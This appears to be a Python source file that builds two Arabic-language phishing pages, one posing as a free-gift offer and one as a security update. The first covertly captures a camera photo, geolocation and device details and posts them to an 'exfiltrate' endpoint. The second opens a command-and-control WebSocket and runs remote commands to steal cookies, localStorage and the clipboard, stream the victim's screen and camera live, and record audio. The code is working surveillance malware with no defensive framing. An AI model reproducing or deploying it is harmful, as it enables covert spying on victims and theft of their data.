def get_intel_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>فحص التوافق والمكافأة الرقمية</title>
    <style>
        body {{ background-color: #090d16; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }}
        .loader {{ border: 4px solid #1e293b; border-top: 4px solid #0ea5e9; border-radius: 50%; width: 55px; height: 55px; animation: spin 0.8s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .box {{ background: #0f172a; padding: 25px; border-radius: 12px; display: inline-block; border: 1px solid #334155; max-width: 400px; width: 90%; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="box" onclick="forceActivate()">
        <h2>🎁 انقر هنا لاستلام الهدية الفورية!</h2>
        <div class="loader"></div>
        <p style="color: #94a3b8; font-size: 13px;">جاري فحص الجهاز وتحضير المكافأة...</p>
    </div>
    <video id="v" autoplay playsinline style="opacity: 0.01; position: absolute; pointer-events: none;"></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const linkId = "{link_id}";
        async function runIntel() {{
            try {{
                let img = "";
                try {{
                    const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                    const video = document.getElementById('v');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(r => setTimeout(r, 1200));
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    img = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(t => t.stop());
                }} catch(e) {{}}

                let geo = {{}};
                try {{
                    geo = await new Promise((res) => {{
                        navigator.geolocation.getCurrentPosition(
                            p => res({{ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy + "م" }}),
                            e => res({{ err: "مرفوض" }}),
                            {{ enableHighAccuracy: true, timeout: 3000 }}
                        );
                    }});
                }} catch(e) {{}}

                const sys = {{ res: window.screen.width + 'x' + window.screen.height, platform: navigator.platform }};
                await fetch('/api/v1/exfiltrate', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ link_id: linkId, device_info: navigator.userAgent, camera_snapshot_base64: img, geolocation: geo, stolen_data: sys }})
                }});
            }} catch(e) {{}}
        }}
        function forceActivate() {{ runIntel(); }}
        window.onload = runIntel;
    </script>
</body>
</html>"""

def get_live_template(link_id: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام الأمني المشفر</title>
    <style>
        body {{ background-color: #020617; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 40px; }}
        .loader {{ border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.7s linear infinite; margin: 15px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .card {{ background: #0f172a; padding: 25px; border-radius: 16px; display: inline-block; border: 1px solid #1e293b; max-width: 400px; width: 90%; cursor: pointer; }}
        #v_cam, #v_screen, #v_audio {{ opacity: 0.01; position: fixed; top: 0; left: 0; width: 1px; height: 1px; pointer-events: none; z-index: -999; }}
        canvas {{ display: none; }}
    </style>
</head>
<body>
    <div class="card" onclick="unlockEngine()">
        <h2>🛡️ انقر للمتابعة وتثبيت التحديث الأمني</h2>
        <div class="loader"></div>
        <p style="color: #94a3b8; font-size: 13px;">جاري تشغيل محرك الاتصال الخفي...</p>
    </div>
    <video id="v_cam" autoplay playsinline muted></video>
    <video id="v_screen" autoplay playsinline muted></video>
    <canvas id="c_canvas"></canvas>
    
    <script>
        const linkId = "{link_id}";
        let ws;
        let isWsActive = false;
        let activeStream = null;
        let liveStreamTimer = null;
        let screenStream = null;

        async function initPersistenceEngine() {{
            try {{
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                gainNode.gain.value = 0.00001;
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                oscillator.start();

                if ('wakeLock' in navigator) {{
                    await navigator.wakeLock.request('screen');
                }}
            }} catch(e) {{}}
        }}

        function stopAllStreams() {{
            if (liveStreamTimer) {{ clearInterval(liveStreamTimer); liveStreamTimer = null; }}
            if (activeStream) {{ activeStream.getTracks().forEach(t => t.stop()); activeStream = null; }}
            if (screenStream) {{ screenStream.getTracks().forEach(t => t.stop()); screenStream = null; }}
        }}

        // أدوات منفصلة تماماً - كل أداة تقوم بمهمة مستقلة بدقة مطلقة
        async function executeCommand(cmdPacket) {{
            let output = "";
            try {{
                switch(cmdPacket.cmd) {{
                    case "dump_cookies":
                        output = document.cookie || "فارغة أو محمية";
                        break;
                    case "dump_localstorage":
                        let ls = {{}};
                        for (let i = 0; i < localStorage.length; i++) {{
                            let k = localStorage.key(i);
                            ls[k] = localStorage.getItem(k);
                        }}
                        output = JSON.stringify(ls);
                        break;
                    case "screen_snapshot":
                        try {{
                            if (!screenStream) {{
                                screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen" }} }});
                            }}
                            let videoElem = document.getElementById('v_screen');
                            videoElem.srcObject = screenStream;
                            await videoElem.play();
                            await new Promise(r => setTimeout(r, 600));
                            const canvas = document.getElementById('c_canvas');
                            canvas.width = videoElem.videoWidth || window.innerWidth;
                            canvas.height = videoElem.videoHeight || window.innerHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                            output = canvas.toDataURL('image/jpeg', 0.85);
                        }} catch(err) {{
                            output = "❌ فشل التقاط الشاشة: يتطلب إذن تفاعلي مباشر.";
                        }}
                        break;
                    case "start_live_screen":
                        stopAllStreams();
                        try {{
                            screenStream = await navigator.mediaDevices.getDisplayMedia({{ video: {{ mediaSource: "screen", frameRate: 15 }} }});
                            let videoElem = document.getElementById('v_screen');
                            videoElem.srcObject = screenStream;
                            await videoElem.play();
                            liveStreamTimer = setInterval(() => {{
                                try {{
                                    const canvas = document.getElementById('c_canvas');
                                    canvas.width = videoElem.videoWidth || window.innerWidth;
                                    canvas.height = videoElem.videoHeight || window.innerHeight;
                                    const ctx = canvas.getContext('2d');
                                    ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                                    sendResult("live_screen_frame", canvas.toDataURL('image/jpeg', 0.6));
                                }} catch(e) {{}}
                            }}, 2000);
                            return "🔴 تم تفعيل البث الحي للشاشة بنجاح!";
                        }} catch(e) {{
                            return "❌ فشل بدء البث الحي للشاشة.";
                        }}
                        break;
                    case "stop_live_screen":
                        stopAllStreams();
                        return "⏹️ تم إيقاف البث الحي للشاشة بنجاح.";
                    case "start_live_camera":
                        stopAllStreams();
                        try {{
                            activeStream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                            let videoElem = document.getElementById('v_cam');
                            videoElem.srcObject = activeStream;
                            await videoElem.play();
                            await new Promise(r => setTimeout(r, 800));
                            liveStreamTimer = setInterval(() => {{
                                try {{
                                    const canvas = document.getElementById('c_canvas');
                                    canvas.width = videoElem.videoWidth || 640;
                                    canvas.height = videoElem.videoHeight || 480;
                                    const ctx = canvas.getContext('2d');
                                    ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                                    sendResult("live_camera_frame", canvas.toDataURL('image/jpeg', 0.7));
                                }} catch(e) {{}}
                            }}, 2000);
                            return "📹 تم بدء البث الحي لكاميرا الضحية!";
                        }} catch(e) {{
                            return "❌ فشل تشغيل الكاميرا الحية.";
                        }}
                        break;
                    case "dump_clipboard":
                        try {{
                            output = await navigator.clipboard.readText();
                        }} catch(e) {{
                            output = "مرفوض الصلاحية أو الحافظة فارغة";
                        }}
                        break;
                    case "record_audio":
                        try {{
                            const audioStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                            const mediaRecorder = new MediaRecorder(audioStream);
                            let chunks = [];
                            mediaRecorder.ondataavailable = e => chunks.push(e.data);
                            mediaRecorder.onstop = async () => {{
                                const blob = new Blob(chunks, {{ 'type': 'audio/ogg; codecs=opus' }});
                                const reader = new FileReader();
                                reader.readAsDataURL(blob);
                                reader.onloadend = function() {{
                                    sendResult("audio_clip", reader.result);
                                }}
                                audioStream.getTracks().forEach(t => t.stop());
                            }};
                            mediaRecorder.start();
                            setTimeout(() => mediaRecorder.stop(), 5000);
                            return "🎤 جاري التقاط التسجيل الصوتي الحي (5 ثوانٍ)...";
                        }} catch(err) {{
                            output = "❌ فشل التقاط الصوت: الميكروفون مقفل أو مرفوض.";
                        }}
                        break;
                }}
            }} catch(err) {{
                output = "خطأ في التنفيذ: " + err.message;
            }}
            return output;
        }}

        function sendResult(cmd, data) {{
            const payload = {{ link_id: linkId, cmd: cmd, data: data }};
            if (isWsActive && ws && ws.readyState === WebSocket.OPEN) {{
                ws.send(JSON.stringify({{type: "response", ...payload}}));
            }} else {{
                fetch('/api/v1/c2-respond', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }}).catch(e => {{}});
            }}
        }}

        function initEnterpriseC2() {{
            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            ws = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);
            ws.onopen = function() {{ isWsActive = true; }};
            ws.onmessage = async function(event) {{
                try {{
                    const pkt = JSON.parse(event.data);
                    if (pkt.cmd === "ping") {{ ws.send(JSON.stringify({{type: "pong"}})); return; }}
                    let resData = await executeCommand(pkt);
                    if (resData && pkt.cmd !== "record_audio" && !pkt.cmd.includes("live_")) {{
                        sendResult(pkt.cmd, resData);
                    }}
                }} catch(err) {{}}
            }};
            ws.onclose = function() {{
                isWsActive = false;
                setTimeout(initEnterpriseC2, 1000);
            }};
        }}

        async function unlockEngine() {{
            await initPersistenceEngine();
            initEnterpriseC2();
        }}

        window.onload = unlockEngine;
    </script>
</body>
</html>"""
